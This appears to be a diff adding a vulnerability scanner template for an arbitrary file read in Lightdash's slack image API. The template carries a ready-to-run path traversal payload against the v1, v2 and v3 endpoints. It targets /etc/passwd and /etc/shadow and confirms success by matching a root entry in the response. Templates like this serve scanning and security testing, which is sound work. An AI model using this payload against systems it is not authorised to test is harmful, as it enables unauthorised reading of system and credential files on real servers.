@@ -1,0 +1,28 @@
+id: lightdash-lfi
+
+info:
+  name: lightdash api file read
+  severity: high
+  description: |
+    lightdash has an api endpoint to read slack image but it can abused to read arbitray file
+  author: reewarius
+  tags: lfi,lfr,generic
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+      - "{{BaseURL}}/api/v2/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+      - "{{BaseURL}}/api/v3/slack/image/slack-image{{ url_encode(concat('/../../../../..', file)) }}"
+      
+    payloads:
+      file:
+        - "/etc/passwd"
+        - "/etc/shadow"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
